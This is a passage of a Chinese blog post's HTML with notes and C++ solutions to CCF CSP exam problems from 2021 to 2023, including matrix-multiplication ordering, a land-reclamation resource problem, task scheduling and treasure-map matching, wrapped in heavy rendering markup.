style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p><p>可以看到，最终得到的矩阵的第一行第一列数据是A中的第一行和B中的第一列相乘相加，同样，第一行第二列的数据就是A的第一行和B中的第二列相乘并相加。</p><p>所以不难得到这道题的答案，但是想要拿满分这还不够。有30%的数据是比较大的，而n又远大于d，所以应该尽量让最后的运算中所含n的矩阵的运算减少，也就是说只需要修改运算顺序为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>W</mi><mo>⋅</mo><mo stretchy="false">(</mo><mi>Q</mi><mo>×</mo><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>×</mo><mi>V</mi><mo>=</mo><mi>W</mi><mo>⋅</mo><mo stretchy="false">(</mo><mi>Q</mi><mo>×</mo><mo stretchy="false">(</mo><msup><mi>K</mi><mi>T</mi></msup><mo>×</mo><mi>V</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(W \cdot (Q \times K^T))\times V=W \cdot (Q \times (K^T\times V))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mclose">))</span></span></span></span></span></p><p>即可。还要注意一个坑就是需要开long long，不开容易爆。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h2 id="202303-2-垦田计划">202303-2 垦田计划</h2><p>这道题目有70%的分是很好拿的，暴力就能写。暴力思路很简单，就是每次都找耗时最长的区域，把耗时最长的区域投入额外资源，也就是每次耗时减一，随后资源总数减去所需资源数，直到资源总数等于0或耗时最长的区域已经无法再继续减了（也就是耗时最长的区域的时间都比k小），这时候进行输出。</p><p>不出意外的话肯定会出意外，这样想只能拿70的分，因为还有30%的测试集数据量太大了，也就是说m每次减少的太少了，需要多减一点。于是可以想到区间合并。既然减的太少，而且必须把所有同一值全部减一，最后的耗时才会减一，那我直接把所有同一值的区间合并，把他们的资源消耗数量也合并，这样不就好了吗。理论没问题，开始实践：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span><span class="hljs-number">+10</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> m;<br>    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;<br>    <span class="hljs-type">int</span> <span class="hljs-type">max_t</span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> t,c;<br>    <span class="hljs-type">int</span> field[N];<br>    <span class="hljs-built_in">memset</span>(field,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(field));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; t &gt;&gt; c;<br>        field[t]+=c;<br>        <span class="hljs-type">max_t</span>=<span class="hljs-built_in">max</span>(t,<span class="hljs-type">max_t</span>);<span class="hljs-comment">//记录一下此时的最大值，方便第一次的查找</span><br>    &#125;<br>    <span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-type">max_t</span>&gt;k&amp;&amp;m&gt;field[<span class="hljs-type">max_t</span>])<br>        &#123;<br>            m-=field[<span class="hljs-type">max_t</span>];<br>            <span class="hljs-type">max_t</span>--;<br>            field[<span class="hljs-type">max_t</span>]+=field[<span class="hljs-type">max_t</span><span class="hljs-number">+1</span>];<span class="hljs-comment">//每次最大值减一之后，max-1的消耗需要加上之前max的消耗</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-type">max_t</span> &lt;&lt; endl;<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 5 50 1</span><br><span class="hljs-comment">// 9 1</span><br><span class="hljs-comment">// 8 1</span><br><span class="hljs-comment">// 6 1</span><br><span class="hljs-comment">// 3 1</span><br><span class="hljs-comment">// 1 1</span><br><span class="hljs-comment">// 7</span><br><span class="hljs-comment">// 9 8 6 3 1</span><br></code></pre></td></tr></table></figure><h1 id="2022年">2022年</h1><h2 id="202212-2-训练计划">202212-2 训练计划</h2><p>这道题也是拿前70%很简单，但是后30%就需要仔细思考了。</p><p>仔细想想，这道题求最晚开始时间比较难想通。首先如果这个节点是没有被依赖的节点，那它的最晚开始时间其实就是n-自己的时间+1。如果节点x1是被x2依赖的节点，那么它的最晚开始时间其实是x2的最晚开始时间-x1的时间，如果节点x1被多个节点依赖，那它的最晚开始时间其实是min(当前被依赖节点的最晚开始时间-x1的时间,上一个被依赖节点的最晚开始时间-x1的时间)。</p><p>所以就能得到递推公式xm[p].follow_day=min(xm[i].follow_day-xm[p].t,xm[p].follow_day);</p><p>梳理好思路，接下来就简单很多了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">110</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">exprise</span><br>&#123;<br>    <span class="hljs-type">int</span> pre;<br>    <span class="hljs-type">int</span> pre_day=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> follow_day=<span class="hljs-number">1e9</span>;<br>    <span class="hljs-type">int</span> follow=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> t;<br>&#125; xm[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,sum=<span class="hljs-number">0</span>,m,p,t;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<br>    xm[<span class="hljs-number">0</span>].t=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;p);<br>        xm[i].pre=p;<br>        xm[p].follow=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;t);<br><br>        <span class="hljs-keyword">if</span>(sum&lt;t)<span class="hljs-comment">//更新最大</span><br>        sum=t;<br><br>        p=xm[i].pre;<br>        xm[i].t=t;<br><br>        <span class="hljs-keyword">if</span>(p) <span class="hljs-comment">//更新依赖的天数</span><br>        xm[i].pre_day+=xm[p].pre_day+xm[p].t;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(xm[i].pre==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,xm[i].pre_day<span class="hljs-number">+1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = m; i &gt;= <span class="hljs-number">1</span>; i--)<br>    &#123;<br>        p=xm[i].pre;<br>        <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>&amp;&amp;xm[i].follow==<span class="hljs-number">0</span>)<span class="hljs-comment">//有前驱无后继</span><br>        &#123;<br>            xm[i].follow_day=n-xm[i].t<span class="hljs-number">+1</span>;<br>            xm[p].follow_day=<span class="hljs-built_in">min</span>(xm[i].follow_day-xm[p].t,xm[p].follow_day);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">0</span>&amp;&amp;xm[i].follow==<span class="hljs-number">1</span>)<span class="hljs-comment">//有前驱有后继，更新前驱(自己的被后继更新过了)</span><br>        &#123;<br>            xm[p].follow_day=<span class="hljs-built_in">min</span>(xm[i].follow_day-xm[p].t,xm[p].follow_day);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(xm[i].follow==<span class="hljs-number">0</span>&amp;&amp;p==<span class="hljs-number">0</span>)<span class="hljs-comment">//无前驱后继</span><br>        &#123;<br>            xm[i].follow_day=n-xm[i].t<span class="hljs-number">+1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(xm[p].follow_day&lt;<span class="hljs-number">0</span>)<br>        &#123;<br>            flag=<span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!flag)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,xm[i].follow_day);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="202209-2-何以包邮">202209-2 何以包邮</h2><p>这道题就是背包问题，一开始忘了背包咋写的了，近几年真的是越来越难了。之后上网搜索之后发现背包问题其实比较套路，但是状态转移方程真的很不好想。这道题稍微做了一点变形，就不是很做的出来了。</p><p>首先需要明确的是这道题和背包问题有什么异同？可以看到这道题中每本书只能选择一次，并且所有选择的书的价值必须大于x，这和背包问题中的选择价值最大的物品非常像。但是这道题又有点不同，它需要在商品的价值满足大于x的同时又是最小值。</p><p>那我们该怎么定义这个问题，让它和背包问题看起来差不多呢？主要在于对于题目中给定条件的转换，其实大于x也就是选定商品总价值减x是大于0的，这个情况下选取最小的数</p><h2 id="202206-2-寻宝！大冒险！">202206-2 寻宝！大冒险！</h2><p>这道题不知道咋用算法，但是有一些优化的思路，虽然最后还是写成屎山，但是总算是满分了。</p><p>70%那部分数据就不说了，纯构建两个二维数组遍历即可。说一说另外30%的数据，这部分我的优化思路就是对于每个在绿化图中的树，都拿寻宝图的B(0,0)去尝试碰一碰。</p><p>首先是对于绿化图中的树，只用一个一维数组进行存储，自定义一个带x和y的结构体即可，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">zuobiao</span><br>&#123;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(zuobiao a, zuobiao b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(a.x==b.x)<br>    <span class="hljs-keyword">return</span> a.y&lt;b.y;<br>    <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> a.x&lt;b.x;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,L,S;<br>    cin &gt;&gt; n &gt;&gt; L &gt;&gt; S;<br>    zuobiao trees[<span class="hljs-number">1010</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; trees[i].x &gt;&gt; trees[i].y;<br>    &#125;<br>    <span class="hljs-type">int</span> t_map[<span class="hljs-number">51</span>][<span class="hljs-number">51</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = S; i &gt;= <span class="hljs-number">0</span>; i--)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= S; j++)<br>        &#123;<br>            cin &gt;&gt; t_map[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(trees,trees+n,cmp);<br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> ea = <span class="hljs-number">0</span>; ea &lt; n; ea++)<br>    &#123;<br>        <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">//即A(x,y)与B(0,0)对应</span><br>        <span class="hljs-type">int</span> x=trees[ea].x;<br>        <span class="hljs-type">int</span> y = trees[ea].y;<br><br>        <span class="hljs-comment">//从下一个树（起点的数已经做过比较了）开始遍历B的每一个1，查看位置是否跟下一个A中的1对应，也就是A(x+i,y+j)=B(i,j)</span><br>        <span class="hljs-type">int</span> ex=ea<span class="hljs-number">+1</span>;<br><br>        <span class="hljs-keyword">if</span>(x+S&gt;L||y+S&gt;L)<br>        flag=<span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= S; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= S; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i==<span class="hljs-number">0</span>&amp;&amp;j==<span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span>(ex&lt;n&amp;&amp;trees[ex].x==i+x&amp;&amp;trees[ex].y==j+y)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(t_map[i][j]==<span class="hljs-number">1</span>)<br>                    ex++;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        flag=<span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">if</span>(t_map[i][j]==<span class="hljs-number">1</span>)<br>                    &#123;<br>                        flag=<span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">while</span>(ex&lt;n)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(trees[ex].y&gt;y+S||trees[ex].y&lt;y)<br>                    ex++;<br>                    <span class="hljs-keyword">else</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!flag)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(flag)<br>        &#123;<br>            cnt++;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; cnt &lt;&lt; endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2021年">2021年</h1><h2 id="202112-2-序列查询新解">202112-2 序列查询新解</h2><h3 id="暴力-剪枝（80分）">暴力+剪枝（80分）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span 